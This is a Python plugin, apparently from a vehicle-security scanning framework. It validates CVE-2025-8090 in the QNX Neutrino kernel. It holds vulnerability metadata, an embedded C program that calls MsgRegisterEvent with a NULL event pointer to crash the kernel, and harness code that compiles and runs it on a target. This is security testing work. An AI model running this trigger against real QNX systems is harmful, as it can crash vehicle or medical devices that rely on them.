#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import os
import shlex
import subprocess
import tempfile

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin
from local_exp_stimulus import result_indicates_crash


VULN = {
    "id": 20,
    "cve": "CVE-2025-8090",
    "year": 2025,
    "domain": "IVI/OS/协议/隐私",
    "vendor_product": "BlackBerry QNX SDP / Neutrino Kernel",
    "component": "Kernel",
    "type": "空指针引用/DoS",
    "summary": "QNX Neutrino Kernel空指针引用导致本地拒绝服务。",
    "source_description": "Null pointer dereference in the MsgRegisterEvent() system call could allow an attacker with local access and code execution abilities to crash the QNX Neutrino kernel.",
    "poc_status": "未见公开PoC",
    "research_value": "车载OS/多媒体/无钥匙系统供应链风险。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2025-8090",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-8090",
        "https://support.blackberry.com/pkb/s/article/141027",
        "https://cveawg.mitre.org/api/cve/CVE-2025-8090"
    ],
    "affected": [
        {
            "vendor": "BlackBerry Ltd",
            "product": "QNX Software Development Platform",
            "versions": [
                {
                    "version": "7.1 and 7.0",
                    "status": "affected",
                    "versionType": "custom"
                },
                {
                    "version": "cpe:2.3:a:blackberry:qnx_software_development_platform:7.1:*:*:*:*:*:*:*",
                    "status": "affected",
                    "versionType": "cpe"
                },
                {
                    "version": "cpe:2.3:a:blackberry:qnx_software_development_platform:7.0:*:*:*:*:*:*:*",
                    "status": "affected",
                    "versionType": "cpe"
                }
            ]
        },
        {
            "vendor": "BlackBerry Ltd",
            "product": "QNX OS for Safety",
            "versions": [
                {
                    "version": "2.2.7 and earlier",
                    "status": "affected",
                    "versionType": "custom"
                },
                {
                    "version": "cpe:2.3:o:blackberry:qnx_os_for_safety:2.2:7:*:*:*:*:*:*",
                    "status": "affected",
                    "versionType": "cpe"
                },
                {
                    "version": "2.1.4 and earlier",
                    "status": "affected",
                    "versionType": "custom"
                },
                {
                    "version": "cpe:2.3:o:blackberry:qnx_os_for_safety:2.1:4:*:*:*:*:*:*",
                    "status": "affected",
                    "versionType": "cpe"
                },
                {
                    "version": "2.0.2 and earlier",
                    "status": "affected",
                    "versionType": "custom"
                },
                {
                    "version": "cpe:2.3:o:blackberry:qnx_os_for_safety:2.0:2:*:*:*:*:*:*",
                    "status": "affected",
                    "versionType": "cpe"
                }
            ]
        },
        {
            "vendor": "BlackBerry Ltd.",
            "product": "QNX OS for Medical",
            "versions": [
                {
                    "version": "2.0.1 and earlier",
                    "status": "affected",
                    "versionType": "custom"
                },
                {
                    "version": "cpe:2.3:o:blackberry:qnx_os_for_medical:2.0:1:*:*:*:*:*:*",
                    "status": "affected",
                    "versionType": "cpe"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2025-8090",
        "BlackBerry",
        "QNX",
        "SDP",
        "Neutrino",
        "Kernel",
        "DoS",
        "Null",
        "pointer",
        "dereference",
        "MsgRegisterEvent",
        "system",
        "call",
        "could",
        "allow",
        "local",
        "access",
        "code",
        "execution",
        "abilities",
        "crash",
        "kernel",
        "BlackBerry Ltd",
        "QNX Software Development Platform",
        "QNX OS for Safety",
        "QNX OS for Medical"
    ]
}


def _write_qnx_msgregisterevent_trigger() -> str:
    source = r"""#include <stdio.h>
#include <stdlib.h>
#include <sys/neutrino.h>
#include <sys/netmgr.h>

int main(void) {
    struct sigevent *sev = NULL;
    int chid = ChannelCreate(0);
    if (chid == -1) {
        perror("ChannelCreate");
        return 2;
    }
    int rc = MsgRegisterEvent(sev, chid);
    printf("MsgRegisterEvent rc=%d chid=%d\n", rc, chid);
    return 0;
}
"""
    fd, path = tempfile.mkstemp(prefix="autosec_cve_2025_8090_", suffix=".c")
    with os.fdopen(fd, "w", encoding="utf-8") as handle:
        handle.write(source)
    return path


def _qnx_kernel_probe(plugin, vuln):
    source_path = plugin.params.get("source_path") or _write_qnx_msgregisterevent_trigger()
    compiler_cmd = plugin.params.get("qnx_cc_cmd") or plugin.params.get("compiler_cmd")
    runner_cmd = plugin.params.get("qnx_run_cmd") or plugin.params.get("runner_cmd")
    evidence = {
        "ok": True,
        "sample_path": source_path,
        "payload_bytes": os.path.getsize(source_path),
        "sample_source": "operator_supplied" if plugin.params.get("source_path") else "generated_stimulus",
        "phenomenon": "local MsgRegisterEvent null-dereference trigger source prepared for kernel/process crash observation",
        "requires_manual_review": True,
    }
    if not compiler_cmd:
        evidence["operator_action"] = "Compile sample_path on a QNX lab target with qnx_cc_cmd, then run it with qnx_run_cmd/runner_cmd to observe panic, abort, or crash."
        return evidence
    binary_path = tempfile.mktemp(prefix="autosec_cve_2025_8090_", suffix=".bin")
    compile_proc = subprocess.run(
        shlex.split(str(compiler_cmd)) + [str(source_path), "-o", binary_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=float(plugin.params.get("timeout", 20)),
        check=False,
    )
    compile_stdout = compile_proc.stdout.decode("utf-8", errors="replace")
    compile_stderr = compile_proc.stderr.decode("utf-8", errors="replace")
    evidence.update({
        "compiler_cmd": compiler_cmd,
        "compile_returncode": compile_proc.returncode,
        "compile_stdout_excerpt": compile_stdout[:1000],
        "compile_stderr_excerpt": compile_stderr[:1000],
        "compiled_binary": binary_path if compile_proc.returncode == 0 and os.path.exists(binary_path) else "",
    })
    if compile_proc.returncode != 0 or not os.path.exists(binary_path):
        evidence["operator_action"] = "Fix toolchain or pass a working qnx_cc_cmd; binary did not compile."
        return evidence
    if not runner_cmd:
        evidence["operator_action"] = "Run compiled_binary on the target with qnx_run_cmd/runner_cmd and observe panic, reboot, or service crash."
        return evidence
    run_proc = subprocess.run(
        shlex.split(str(runner_cmd)) + [binary_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=float(plugin.params.get("timeout", 20)),
        check=False,
    )
    run_stdout = run_proc.stdout.decode("utf-8", errors="replace")
    run_stderr = run_proc.stderr.decode("utf-8", errors="replace")
    evidence.update({
        "command": runner_cmd,
        "returncode": run_proc.returncode,
        "stdout_excerpt": run_stdout[:1000],
        "stderr_excerpt": run_stderr[:1000],
        "vulnerable": result_indicates_crash(run_proc.returncode, run_stdout, run_stderr),
        "phenomenon": "compiled local trigger executed against QNX MsgRegisterEvent path",
    })
    return evidence


class Poc17CVE20258090NullDerefDoSAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-020'
    meta_poc_name = 'CVE-2025-8090 空指针引用/DoS Active Validation'
    meta_cve_id = 'CVE-2025-8090'
    meta_severity = 'Medium'
    meta_protocol = 'local'
    meta_target_os = ['qnx', 'linux']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['local_artifact']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2025-8090'
    meta_attack_surface = '系统/供应链组件'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_qnx_kernel_probe)
